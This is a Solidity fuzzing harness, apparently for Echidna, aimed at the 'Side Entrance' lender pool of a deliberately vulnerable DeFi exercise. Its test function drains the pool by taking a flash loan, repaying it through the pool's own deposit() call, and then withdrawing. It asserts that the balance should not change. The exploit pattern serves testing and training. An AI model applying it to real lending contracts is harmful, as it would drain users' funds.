// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceEchidna is IFlashLoanEtherReceiver {

    SideEntranceLenderPool private immutable pool;

    constructor() {
        pool = new SideEntranceLenderPool();
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    function shouldTakeFlashLoan() public {
        payable(address(pool)).transfer(10 ether);
        require(address(pool).balance == 10 ether);

        uint balanceBefore = address(pool).balance;
        pool.flashLoan(balanceBefore); // Try to borrow full amount
        pool.withdraw();
        uint balanceAfter = address(pool).balance;

        assert(balanceAfter == balanceBefore); // Should fail when exploit works
    }

    receive() external payable {}
}
